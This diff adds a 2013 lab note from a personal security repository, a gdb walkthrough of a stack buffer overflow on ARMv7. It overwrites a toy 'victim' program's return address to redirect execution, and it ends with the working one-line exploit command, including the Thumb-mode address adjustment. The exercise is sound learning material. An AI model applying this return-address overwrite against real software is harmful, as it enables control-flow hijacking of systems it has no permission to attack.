@@ -1,0 +1,113 @@
+Nov 21 2013
+
+shawn@debian-armhf:~/citypw-SCFE/security/overwrite_ret_addr_armv7$ gdb ./victim -q
+Reading symbols from /home/shawn/citypw-SCFE/security/overwrite_ret_addr_armv7/victim...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x00008448 <+0>:	push	{r7, lr}
+   0x0000844a <+2>:	sub	sp, #8
+   0x0000844c <+4>:	add	r7, sp, #0
+   0x0000844e <+6>:	str	r0, [r7, #4]
+   0x00008450 <+8>:	str	r1, [r7, #0]
+   0x00008452 <+10>:	movw	r3, #34040	; 0x84f8
+   0x00008456 <+14>:	movt	r3, #0
+   0x0000845a <+18>:	mov	r0, r3
+   0x0000845c <+20>:	movw	r1, #33797	; 0x8405
+   0x00008460 <+24>:	movt	r1, #0
+   0x00008464 <+28>:	movw	r2, #33845	; 0x8435
+   0x00008468 <+32>:	movt	r2, #0
+   0x0000846c <+36>:	blx	0x8340 <printf>
+   0x00008470 <+40>:	ldr	r3, [r7, #0]
+   0x00008472 <+42>:	add.w	r3, r3, #4
+   0x00008476 <+46>:	ldr	r3, [r3, #0]
+   0x00008478 <+48>:	mov	r0, r3
+   0x0000847a <+50>:	bl	0x8404 <test>
+   0x0000847e <+54>:	mov.w	r3, #0	==> 0x0000847e should be return address
+   0x00008482 <+58>:	mov	r0, r3
+   0x00008484 <+60>:	add.w	r7, r7, #8
+   0x00008488 <+64>:	mov	sp, r7
+   0x0000848a <+66>:	pop	{r7, pc}
+End of assembler dump.
+(gdb) disassemble fuck_me 
+Dump of assembler code for function fuck_me:
+   0x00008434 <+0>:	push	{r7, lr} ===> Use 0x00008434 to overwrite test()'s ret addr
+   0x00008436 <+2>:	add	r7, sp, #0
+   0x00008438 <+4>:	movw	r0, #34024	; 0x84e8
+   0x0000843c <+8>:	movt	r0, #0
+   0x00008440 <+12>:	blx	0x8358 <puts>
+   0x00008444 <+16>:	pop	{r7, pc}
+End of assembler dump.
+
+Let's check the memory layout:
+
+(gdb) b test
+Breakpoint 1 at 0x840c: file victim.c, line 11.
+(gdb) r AAAABBBB
+Starting program: /home/shawn/citypw-SCFE/security/overwrite_ret_addr_armv7/victim AAAABBBB
+The address of func test(): 0x8405, func fuck_me(): 0x8435
+
+Breakpoint 1, test (input=0x7efff919 "AAAABBBB") at victim.c:11
+11	  strcpy(buf, input);
+(gdb) n
+12	  printf("%s \n", buf);
+(gdb) 
+AAAABBBB 
+13	}
+(gdb) x/12x $sp
+0x7efff658:	0x00000000	0x7efff919	0x000084f8	0x41414141
+0x7efff668:	0x42424242	0x00008400	0x7efff678	0x0000847f
+0x7efff678:	0x7efff7d4	0x00000002	0x00000000	0x76f12cfb
+
+So the layout should be like this:
+[high addr]...[buf:..16-byte...][Return addr]...[low addr]
+
+The weirdo thing is what we saw the return addr above was 0x0000847e, but here it becomes 0x0000847f. WTH?
+
+OK, let's try our 1st exp:
+(gdb) r `python -c 'print "A" * 16 + "\x34\x84"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/shawn/citypw-SCFE/security/overwrite_ret_addr_armv7/victim `python -c 'print "A" * 16 + "\x34\x84"'`
+The address of func test(): 0x8405, func fuck_me(): 0x8435
+
+Breakpoint 1, test (input=0x7efff90f 'A' <repeats 16 times>, "4\204") at victim.c:11
+11	  strcpy(buf, input);
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAA4� 
+
+Program received signal SIGILL, Illegal instruction.
+fuck_me () at victim.c:17
+17	  printf("being hacked\n");
+(gdb) n
+
+Program terminated with signal SIGILL, Illegal instruction.
+The program no longer exists.
+
+Did you see this? +1 with the fuc_me()'s addr, plz.....
+
+(gdb) r `python -c 'print "A" * 16 + "\x35\x84"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/shawn/citypw-SCFE/security/overwrite_ret_addr_armv7/victim `python -c 'print "A" * 16 + "\x35\x84"'`
+The address of func test(): 0x8405, func fuck_me(): 0x8435
+
+Breakpoint 1, test (input=0x7efff90f 'A' <repeats 16 times>, "5\204") at victim.c:11
+11	  strcpy(buf, input);
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAA5� 
+being hacked
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00008432 in test (input=<error reading variable: Cannot access memory at address 0x4141415d>) at victim.c:13
+13	}
+
+It worked! So, the exp should be like:
+shawn@debian-armhf:~/citypw-SCFE/security/overwrite_ret_addr_armv7$ ./victim `python -c 'print "A" * 16 + "\x35\x84"'`
+The address of func test(): 0x8405, func fuck_me(): 0x8435
+AAAAAAAAAAAAAAAA5� 
+being hacked
+Segmentation fault
